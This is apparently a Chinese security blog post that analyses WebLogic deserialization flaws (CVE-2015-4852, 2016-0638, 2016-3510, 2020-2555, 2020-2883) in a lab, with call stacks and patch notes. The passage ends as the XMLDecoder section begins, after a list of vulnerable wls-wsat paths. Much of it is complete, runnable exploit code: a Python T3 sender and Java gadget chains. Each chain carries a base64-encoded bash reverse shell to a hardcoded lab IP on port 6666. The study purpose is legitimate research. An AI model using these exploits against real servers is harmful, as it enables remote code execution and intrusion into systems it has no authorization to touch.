title: Weblogic反序列化漏洞
author: bmth
tags:
  - weblogic
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/3ee3fa52cd0442e9a750f973cb4cf303.png'
cover: 'https://img-blog.csdnimg.cn/3ee3fa52cd0442e9a750f973cb4cf303.png'
date: 2022-12-23 14:42:00
---
![](https://img-blog.csdnimg.cn/3ee3fa52cd0442e9a750f973cb4cf303.png)
还是觉得得研究一下weblogic反序列化漏洞，只会用工具太脚本小子了，我们来看看weblogic是如何造成反序列化漏洞的

WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中

在WebLogic里面反序列化漏洞利用大致分为两种，一个是基于T3协议的反序列化漏洞，一个是基于XML的反序列化漏洞

漏洞复现的环境搭建使用：[https://github.com/QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)
我这里选用的是`jdk7u21`和`wls10.3.6`版本

## T3协议反序列化
参考RoboTerh师傅的文章：
[https://tttang.com/user/RoboTerh](https://tttang.com/user/RoboTerh)
### CVE-2015-4852
影响版本：
- Oracle WebLogic Server 10.3.6.0
- Oracle WebLogic Server 12.1.2.0
- Oracle WebLogic Server 12.1.3.0
- Oracle WebLogic Server 12.2.1.0


这个漏洞主要是利用T3协议可以进行反序列化的操作，来利用cc链进行攻击，也算是T3反序列化的鼻祖了，后续都是根据这个进行的补丁绕过

利用脚本如下：
```python
from os import popen
import struct  # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget, cmd):
    YSO_PATH = "/home/bmth/web/ysoserial-0.0.6-SNAPSHOT-all.jar"
    popen = subprocess.Popen(['java', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    print(data.decode())
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: " + "".join(match))
    else:
        print("Not Weblogic")
        return
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header + desflag + payload
    payload = struct.pack(">I", len(payload)) + payload[4:]
    sock.send(payload)

if __name__ == "__main__":
    ip = "192.168.111.178"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==}|{base64,-d}|{bash,-i}"
    payload = generatePayload(gadget, cmd)
    T3Exploit(ip, port, payload)
```
![](https://img-blog.csdnimg.cn/0986b5e9618d4cbf829d8c8b4c6f6ae0.png)
调用栈如下：
```
readObject:60, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```

T3协议接收过来的数据会在`weblogic.rjvm.InboundMsgAbbrev#readObject`进行反序列化操作，在var1中的head正是我们传递过来的数据，可以看到存在aced0005，为序列化过的标志
![](https://img-blog.csdnimg.cn/5c2d12b51e554094a0ebce311a50d20d.png)

因为`var1.read()`方法中返回的结果为0，所以将会进入`case 0`语句，调用了内部类`InboundMsgAbbrev.ServerChannelInputStream#readObject`方法
![](https://img-blog.csdnimg.cn/8b20b8e3b896425a93f5e90c321097cf.png)

往后执行，可以发现这几个方法是对数据流进行分块处理，将序列化部分分块，依次解析每块的类，然后去执行
![](https://img-blog.csdnimg.cn/aab8f63b728449d28474adc2ca4fb8cd.png)
可以看到调用父类的`ObjectInputStream#resolveClass`方法获取对应类名，并没有做出任何的安全过滤操作，所以能够实例化任意类

官方对此的修复方案是加入黑名单：
![](https://img-blog.csdnimg.cn/6edf066650844435ba3fb5d63d77f289.png)

在黑名单中的类不会被反序列化，该修复方法主要作用在 wlthint3client.jar 包中以下三个位置：
```
weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream
weblogic.rjvm.MsgAbbrevInputStream.class
weblogic.iiop.Utils.class
```

参考：
[weblogic之cve-2015-4852](https://www.cnblogs.com/0x7e/p/14529949.html)
[Weblogic CVE-2015-4852 反序列化RCE分析](https://y4er.com/posts/weblogic-cve-2015-4852)
[WeblogicT3反序列化浅析之cve-2015-4852](https://xz.aliyun.com/t/10563)

### CVE-2016-0638
也就是对CVE-2015-4852补丁的一个绕过，这个漏洞主要是找到了个黑名单之外的类`weblogic.jms.common.StreamMessageImpl`

在Weblogic从流量中的序列化类字节段通过`readClassDesc-readNonProxyDesc-resolveClass`获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的`readObject`、`readResolve`、`readExternal`等方法
而在这里`readExternal`就会被调用
![](https://img-blog.csdnimg.cn/6e9887ea555e4f97bb139d274cc5e2e2.png)

`StreamMessageImpl`在反序列化的时候，根据传递过来的输入数据第一个字节判断是否是1，若为1，会对后续数据调用反序列化函数，var5实际是一个ObjectInputStream，其readObject即开启了后续的反序列化
使用工具：[https://github.com/BabyTeam1024/CVE-2016-0638](https://github.com/BabyTeam1024/CVE-2016-0638)
具体payload如下：
```java
package exploit;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.jms.common.StreamMessageImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2016_0638 {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public byte[] getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==}|{base64,-d}|{bash,-i}"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler);
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        byte[] serializeData=serialize(handler);
        return serializeData;
    }

    public static void main(String[] args) throws Exception {
        byte[] payloadObject = new CVE_2016_0638().getObject();
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(payloadObject,payloadObject.length);
        byte[] payload2 = Serializables.serialize(streamMessage);
        T3ProtocolOperation.send("192.168.111.178", "7001", payload2);
    }
}
```
![](https://img-blog.csdnimg.cn/b9b48406e87148c48226aa4214d4176f.png)

 调用栈如下：
```
readExternal:1433, StreamMessageImpl (weblogic.jms.common)
readExternalData:1835, ObjectInputStream (java.io)
readOrdinaryObject:1794, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```


参考：
[Java安全之Weblogic 2016-0638分析](https://xz.aliyun.com/t/8701)


### CVE-2016-3510
这是对补丁的另一个绕过方法
找到的是 `weblogic.corba.utils.MarshalledObject`这个类，先看一下他的构造方法
![](https://img-blog.csdnimg.cn/757234baab0642d78272b4f63184d806.png)

MarshalledObject接收到参数通过var3进行序列化，并将相关数据存储在objBytes中
我们可以看到他的`readResolve()`方法中存在反序列化
![](https://img-blog.csdnimg.cn/071e30c652f24c5c936587dc8f4b73af.png)

可以看出来是一个二次反序列化，那么paylaod也很好写了：
```java
package exploit;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.corba.utils.MarshalledObject;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2016_3510 {
    public Object getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==}|{base64,-d}|{bash,-i}"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler);
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        return handler;
    }

    public static void main(String[] args) throws Exception {
        Object payloadObject = new CVE_2016_3510().getObject();
        MarshalledObject marshalledObject = new MarshalledObject(payloadObject);
        byte[] payload2 = Serializables.serialize(marshalledObject);
        T3ProtocolOperation.send("192.168.111.178", "7001", payload2);
    }
}
```

调用栈如下：
```
readResolve:58, MarshalledObject (weblogic.corba.utils)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invokeReadResolve:1091, ObjectStreamClass (java.io)
readOrdinaryObject:1805, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```

回显构造：[Weblogic使用ClassLoader和RMI来回显命令执行结果](https://y4er.com/posts/weblogic-uses-classloader-and-rmi-to-display-command-execution-results/)
![](https://img-blog.csdnimg.cn/0ec2d800f9a04f63a672a2dab4c5449a.png)

参考：
[CVE-2016-3510:Weblogic反序列化](https://cloud.tencent.com/developer/article/1850879)

### CVE-2020-2555
2020年3月6日，Oracle Coherence 反序列化远程代码执行漏洞（CVE-2020-2555）的细节被公开，Oracle Coherence为Oracle融合中间件中的产品，在WebLogic 12c及以上版本中默认集成到WebLogic安装包中，攻击者通过t3协议发送构造的序列化数据，执行任意命令

影响版本：
- Oracle Coherence 3.7.1.17
- Oracle Coherence & Weblogic 12.1.3.0.0
- Oracle Coherence & Weblogic 12.2.1.3.0
- Oracle Coherence & Weblogic 12.2.1.4.0

通过研究发现 Weblogic 10.3.6.0 版本不受影响范围内，虽然该版本默认自带了 Coherence（3.7），通过调试发现该版本默认并未启用 Coherence，所以 Weblogic 10.3.6.0 不在受影响范围内

这里我更换了版本为jdk8u121、Weblogic 12.1.3.0，因为`BadAttributeValueExpException`这条链是从JDK 8u76才存在的，然后导出coherence.jar：
```bash
docker cp weblogic12013jdk8u121:/u01/app/oracle/middleware/coherence ./middleware/
```
![](https://img-blog.csdnimg.cn/5e9d69c311754e0382d8bb742085bfa2.png)

注意coherence.jar要使用和目标版本一致的，不然会有serialVersionUID不一致的问题，导致反序列化报错

先给出payload：[https://github.com/Y4er/CVE-2020-2555](https://github.com/Y4er/CVE-2020-2555)
```java
package exploit;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class CVE_2020_2555 {
    public static void main(String[] args) throws Exception {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor reflectionExtractor3  = new ReflectionExtractor("exec", new Object[]{"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==}|{base64,-d}|{bash,-i}"});

        ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{reflectionExtractor1, reflectionExtractor2, reflectionExtractor3});

        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setComparator(chainedExtractor);
        limitFilter.setTopAnchor(Runtime.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        try {
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, limitFilter);
        } catch (Exception e) {
            e.printStackTrace();
        }

        byte[] payload = Serializables.serialize(badAttributeValueExpException);

        T3ProtocolOperation.send("192.168.111.178", "7001", payload);
    }
}
```
成功反弹shell
![](https://img-blog.csdnimg.cn/2af653085b364288affbdb66e0e68e3c.png)

调用栈如下：
```
exec:347, Runtime (java.lang)
invoke:-1, GeneratedMethodAccessor32 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
extract:109, ReflectionExtractor (com.tangosol.util.extractor)
extract:81, ChainedExtractor (com.tangosol.util.extractor)
toString:580, LimitFilter (com.tangosol.util.filter)
readObject:86, BadAttributeValueExpException (javax.management)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:2122, ObjectInputStream (java.io)
readOrdinaryObject:2013, ObjectInputStream (java.io)
readObject0:1535, ObjectInputStream (java.io)
readObject:422, ObjectInputStream (java.io)
readObject:67, InboundMsgAbbrev (weblogic.rjvm)
read:39, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:287, MsgAbbrevJVMConnection (weblogic.rjvm)
init:212, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:507, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:489, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:359, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:970, SocketMuxer (weblogic.socket)
readReadySocket:907, SocketMuxer (weblogic.socket)
process:495, NIOSocketMuxer (weblogic.socket)
processSockets:461, NIOSocketMuxer (weblogic.socket)
run:30, SocketReaderRequest (weblogic.socket)
execute:43, SocketReaderRequest (weblogic.socket)
execute:147, ExecuteThread (weblogic.kernel)
run:119, ExecuteThread (weblogic.kernel)
```
直接跟进到`LimitFilter`的`toString()`方法
可以看到当`m_comparator`是继承于ValueExtractor接口的类时，会尝试调用`m_comparator.extract()`方法
![](https://img-blog.csdnimg.cn/aa2a3799754940d4a2c3ada90f96147c.png)
跟进到ChainedExtractor的extract方法
![](https://img-blog.csdnimg.cn/042a5e69f21e4317b40b66aab73d87e7.png)
可以看到类型为`ReflectionExtractor`，继续跟进它的extract方法
![](https://img-blog.csdnimg.cn/b8b1f3c8766f4b7cbe89bd4ea0456c9c.png)

明显的看到存在反射调用，整个利用链就出来了，只需要设置`BadAttributeValueExpException`的成员变量val为`LimitFilter`就可以完成触发


补丁如下：
![](https://img-blog.csdnimg.cn/d7f92446b59042918466a8992d3d1040.png)

参考：
[Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）](https://paper.seebug.org/1141/)
[使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell](https://xz.aliyun.com/t/8202)
[使用 CVE-2020-2555 攻击 Shiro](https://xz.aliyun.com/t/9343)

### CVE-2020-2883
也就是对CVE-2020-2555补丁的一个绕过，上一个CVE的补丁修复主要是删除掉了`LimitFilter.toString()`中的`extract()`调用

#### ExtractorComparator
POC：[https://github.com/Y4er/CVE-2020-2883/](https://github.com/Y4er/CVE-2020-2883/)
```java
package exploit;

import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

//ExtractorComparator
public class CVE_2020_2883 {
    public static void main(String[] args) throws Exception {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[]{}});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[]{}});
        ReflectionExtractor reflectionExtractor3  = new ReflectionExtractor("exec", new Object[]{"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==}|{base64,-d}|{bash,-i}"});

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                reflectionExtractor1,
                reflectionExtractor2,
                reflectionExtractor3,
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{reflectionExtractor};

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";

        byte[] payload = Serializables.serialize(queue);
        T3ProtocolOperation.send("192.168.111.178", "7001", payload);
    }
}
```

调用栈如下：
```
exec:347, Runtime (java.lang)
invoke:-1, GeneratedMethodAccessor32 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
extract:109, ReflectionExtractor (com.tangosol.util.extractor)
extract:81, ChainedExtractor (com.tangosol.util.extractor)
compare:61, ExtractorComparator (com.tangosol.util.comparator)
siftDownUsingComparator:721, PriorityQueue (java.util)
siftDown:687, PriorityQueue (java.util)
heapify:736, PriorityQueue (java.util)
readObject:795, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:2122, ObjectInputStream (java.io)
readOrdinaryObject:2013, ObjectInputStream (java.io)
readObject0:1535, ObjectInputStream (java.io)
readObject:422, ObjectInputStream (java.io)
readObject:67, InboundMsgAbbrev (weblogic.rjvm)
read:39, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:287, MsgAbbrevJVMConnection (weblogic.rjvm)
init:212, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:507, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:489, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:359, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:970, SocketMuxer (weblogic.socket)
readReadySocket:907, SocketMuxer (weblogic.socket)
process:495, NIOSocketMuxer (weblogic.socket)
processSockets:461, NIOSocketMuxer (weblogic.socket)
run:30, SocketReaderRequest (weblogic.socket)
execute:43, SocketReaderRequest (weblogic.socket)
execute:147, ExecuteThread (weblogic.kernel)
run:119, ExecuteThread (weblogic.kernel)
```

可以看出这条链是从PriorityQueue的readObject开始，然后触发到了`ExtractorComparator#compare`方法
![](https://img-blog.csdnimg.cn/b46dd16b9d5541db9cbe822371063607.png)

可以看出该方法能够调用`m_extractor`属性的extract方法，如果我们将该属性设置为`ChainedExtractor`类对象，就能够形成利用链

#### MultiExtractor
同时还发现另外一个类：MultiExtractor，该类继承关系如下：
![](https://img-blog.csdnimg.cn/2f52a3a0e1d94fd592e7ca6deae361c0.png)

看到`MultiExtractor#extract`，在这里我们可以通过构造`aExtractor[i]`为ChainedExtractor来调用`ChainedExtractor.extract`
![](https://img-blog.csdnimg.cn/7677d0298b944243985d9e524f39d080.png)

看到this.getExtractors()方法，我们可以通过反射控制m_aExtrator属性
![](https://img-blog.csdnimg.cn/97d0252d50d0436ba4a89cf13166993b.png)
并且MultiExtractor没有自己的compare，该类使用的是父类AbstractExtractor的compare函数
![](https://img-blog.csdnimg.cn/8d208eaf64c94e179bb43f133c0d082a.png)

最后的poc如下：
```java
package exploit;

import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.MultiExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

//MultiExtractor
public class CVE_2020_2883_2 {
    public static void main(String[] args) throws Exception {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor reflectionExtractor3  = new ReflectionExtractor("exec", new Object[]{"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==}|{base64,-d}|{bash,-i}"});

        ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{ reflectionExtractor1, reflectionExtractor2, reflectionExtractor3});
        MultiExtractor multiExtractor = new MultiExtractor();

        Field m_aExtractor = multiExtractor.getClass().getSuperclass().getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);
        m_aExtractor.set(multiExtractor, new ValueExtractor[]{chainedExtractor});

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("1");
        priorityQueue.add("2");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, multiExtractor);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(priorityQueue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";

        byte[] serialize = Serializables.serialize(priorityQueue);
        T3ProtocolOperation.send("192.168.111.178", "7001", serialize);
    }
}
```

调用栈如下：
```
exec:347, Runtime (java.lang)
invoke:-1, GeneratedMethodAccessor32 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
extract:109, ReflectionExtractor (com.tangosol.util.extractor)
extract:81, ChainedExtractor (com.tangosol.util.extractor)
extract:94, MultiExtractor (com.tangosol.util.extractor)
compare:79, AbstractExtractor (com.tangosol.util.extractor)
siftDownUsingComparator:721, PriorityQueue (java.util)
siftDown:687, PriorityQueue (java.util)
heapify:736, PriorityQueue (java.util)
readObject:795, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:2122, ObjectInputStream (java.io)
readOrdinaryObject:2013, ObjectInputStream (java.io)
readObject0:1535, ObjectInputStream (java.io)
readObject:422, ObjectInputStream (java.io)
readObject:67, InboundMsgAbbrev (weblogic.rjvm)
read:39, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:287, MsgAbbrevJVMConnection (weblogic.rjvm)
init:212, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:507, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:489, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:359, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:970, SocketMuxer (weblogic.socket)
readReadySocket:907, SocketMuxer (weblogic.socket)
process:495, NIOSocketMuxer (weblogic.socket)
processSockets:461, NIOSocketMuxer (weblogic.socket)
run:30, SocketReaderRequest (weblogic.socket)
execute:43, SocketReaderRequest (weblogic.socket)
execute:147, ExecuteThread (weblogic.kernel)
run:119, ExecuteThread (weblogic.kernel)
```

参考：
[CVE-2020-2883:Weblogic反序列化](https://xz.aliyun.com/t/8577)

## XMLDecoder反序列化
参考：
[WebLogic-XMLDecoder反序列化漏洞分析](https://xz.aliyun.com/t/8465)

### CVE-2017-3506&10271
影响范围：
- Oracle WebLogic Server 10.3.6.0
- Oracle WebLogic Server 12.1.3.0
- Oracle WebLogic Server 12.2.1.0
- Oracle WebLogic Server 12.2.1.1
- Oracle WebLogic Server 12.2.1.2

该漏洞利用weblogic的wls-wsat组件对XML用XMLDecoder进行解析的功能，从而对其传入恶意XML数据造成反序列化攻击

在wls-wsat.war包中的文件`/WEB-INF/web.xml`内，其中的路由均存在漏洞，即：
```
[*] wls-wsat组件路径：
/wls-wsat/CoordinatorPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/ParticipantPortType
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/RegistrationRequesterPortType11
```

